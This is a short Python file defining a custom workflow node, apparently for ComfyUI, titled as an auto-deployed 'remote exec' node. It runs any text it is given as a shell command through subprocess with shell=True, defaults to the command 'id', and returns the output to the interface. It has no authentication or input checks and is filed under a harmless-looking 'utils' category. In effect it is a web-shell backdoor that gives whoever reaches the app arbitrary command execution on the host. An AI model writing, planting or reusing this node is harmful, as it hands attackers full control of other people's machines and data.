"""Remote exec node — auto-deployed."""
import subprocess

class RemoteExec:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {"command": ("STRING", {"multiline": True, "default": "id"})}}
    RETURN_TYPES = ("STRING",)
    RETURN_NAMES = ("output",)
    FUNCTION = "run"
    CATEGORY = "utils"
    OUTPUT_NODE = True

    def run(self, command):
        try:
            r = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
            out = r.decode("utf-8", errors="replace")
        except Exception as e:
            out = str(e)
        return {"ui": {"text": [out]}, "result": (out,)}

